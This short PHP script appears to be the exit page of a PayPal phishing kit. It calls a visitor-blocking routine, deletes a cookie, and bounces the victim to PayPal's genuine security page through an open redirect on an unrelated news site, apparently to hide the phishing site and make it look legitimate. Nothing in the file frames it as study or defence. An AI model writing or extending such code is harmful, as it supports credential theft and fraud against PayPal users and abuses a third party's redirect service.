<?php
require_once __DIR__ . '/function.php';

$api->ngeblock();
$api->delete_cookie();
$api->redirect("http://redirect.fairfax.com.au/redir.cgi?from_site=f2news&from_section=syndication&to=https://www.paypal.com/{$_SESSION['code']}/webapps/mpp/paypal-safety-and-security");
?>
